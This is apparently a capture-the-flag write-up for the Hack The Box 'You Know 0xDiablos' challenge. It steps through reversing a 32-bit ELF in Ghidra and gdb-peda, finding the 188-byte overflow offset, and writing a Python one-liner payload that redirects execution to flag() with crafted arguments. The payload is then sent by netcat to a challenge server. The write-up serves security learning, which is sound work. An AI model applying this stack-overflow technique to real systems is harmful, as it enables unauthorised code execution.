# You Know 0xDiablos
## Unix buffer overflow
## Ghidra
## gdb-peda
``````

Check the program type

file vuln

Response:

vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped

Run program:

chmod 700 vuln
./vuln

You know who are 0xDiablos: 
whoami
whoami

Open in ghidra

ghidra &

File -> New Project -> Non-shared project
File -> Import File (file that will be reverse-engineered) -> Select File to Import -> OK -> OK
Double click imported file (or click dragon) -> OK
Go to: Symbol Tree -> Functions -> Flag -> Decompile: flag - (vuln)

void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);

Determine the hexidecimal value of param_1 and param_2:
Click on -0x21524111 and -0x3f212ff3 in the above function while in Ghidra CodeBrowser

or

param_1:

printf "%X\n" -0x21524111

FFFFFFFFDEADBEEF

Param_2:

printf "%X\n" -0x3f212ff3

FFFFFFFFC0DED00D

Alternatively download Cutter from:

https://cutter.re/

mkdir ~/bin
cd ~/Downloads; sudo mv Cutter-v2.0.5-x64.Linux.AppImage ~/bin
cd ~/bin; chmod 700 Cutter-v2.0.5-x64.Linux.AppImage
./Cutter-v2.0.5-x64.Linux.AppImage
Select file (vuln) -> Open -> Ok -> Click 'sym.flag'

sudo apt install gdb
git clone https://github.com/longld/peda.git /opt/peda
echo "source /opt/peda/peda.py" >> ~/.gdbinit

gdb vuln
gdb-peda$ checksec

CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial

gdb-peda$ start

[----------------------------------registers-----------------------------------]
EAX: 0xf7fa29e8 --> 0xffffcdbc --> 0xffffcf83 ("SHELL=/bin/")
EBX: 0x0 
ECX: 0xffffcd10 --> 0x1 
EDX: 0xffffcd44 --> 0x0 
ESI: 0x1 
EDI: 0x80490d0 (<_start>:	xor    ebp,ebp)
EBP: 0xffffccf8 --> 0x0 
ESP: 0xffffccf0 --> 0xffffcd10 --> 0x1 
EIP: 0x80492c0 (<main+15>:	sub    esp,0x10)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80492bc <main+11>:	mov    ebp,esp
   0x80492be <main+13>:	push   ebx
   0x80492bf <main+14>:	push   ecx
=> 0x80492c0 <main+15>:	sub    esp,0x10
   0x80492c3 <main+18>:	call   0x8049120 <__x86.get_pc_thunk.bx>
   0x80492c8 <main+23>:	add    ebx,0x2d38
   0x80492ce <main+29>:	mov    eax,DWORD PTR [ebx-0x4]
   0x80492d4 <main+35>:	mov    eax,DWORD PTR [eax]
[------------------------------------stack-------------------------------------]
0000| 0xffffccf0 --> 0xffffcd10 --> 0x1 
0004| 0xffffccf4 --> 0x0 
0008| 0xffffccf8 --> 0x0 
0012| 0xffffccfc --> 0xf7dd3905 (<__libc_start_main+229>:	add    esp,0x10)
0016| 0xffffcd00 --> 0x1 
0020| 0xffffcd04 --> 0x80490d0 (<_start>:	xor    ebp,ebp)
0024| 0xffffcd08 --> 0x0 
0028| 0xffffcd0c --> 0xf7dd3905 (<__libc_start_main+229>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x080492c0 in main ()

gdb-peda$ pattern_create 200 buf.txt

Writing pattern of 200 chars to filename "buf.txt"

gdb-peda$ r < buf.txt

Starting program: /home/windows_kali/htb/Beginner_Track/You_know_0xDiablos/vuln < buf.txt
You know who are 0xDiablos: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xc9 
EBX: 0x76414158 ('XAAv')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0x1 
EDI: 0x80490d0 (<_start>:	xor    ebp,ebp)
EBP: 0x41594141 ('AAYA')
ESP: 0xffffcce0 ("ZAAxAAyA")
EIP: 0x41417741 ('AwAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41417741
[------------------------------------stack-------------------------------------]
0000| 0xffffcce0 ("ZAAxAAyA")
0004| 0xffffcce4 ("AAyA")
0008| 0xffffcce8 --> 0xffffcd00 --> 0x1 
0012| 0xffffccec --> 0x3e8 
0016| 0xffffccf0 --> 0xffffcd10 --> 0x1 
0020| 0xffffccf4 --> 0x0 
0024| 0xffffccf8 --> 0x0 
0028| 0xffffccfc --> 0xf7dd3905 (<__libc_start_main+229>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41417741 in ?? ()

Note the EIP:

EIP: 0x41417741 ('AwAA')

gdb-peda$ pattern_offset 0x41417741

1094809409 found at offset: 188

Locate the start location of the flag function

gdb-peda$ disas flag

Dump of assembler code for function flag:
   0x080491e2 <+0>:	push   ebp

Result:

0x080491e2

Create buf_exploit.txt:

python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 188 + b"\xe2\x91\x04\x08" + b"DUMB\xef\xbe\xad\xde\x0d\xd0\xde\xc0")' > buf_exploit.txt

188 "A" bytes 
+ EIP in little endian format
+ dummy parameters in place of param_1 and param_2 to initiate flag function call without error
  - param_1 followed by param_2 both also in little endian format

Create a test flag:

echo "TestingPurposes" > flag.txt

cat buf_exploit.txt | ./vuln

You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADUMBﾭ�
TestingPurposes
[1]    2193 done                cat buf_exploit.txt | 
       2194 segmentation fault  ./vuln

Upon success complete the exploit on target:

cat buf_exploit.txt - | nc 46.101.28.14 30139

You know who are 0xDiablos: 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADUMBﾭ�
HTB{flag}

``````

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623135654.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623130503.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623141224.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623134717.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623130601.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623130700.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623130939.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623131718.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623132316.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220623143636.png)

#hacking
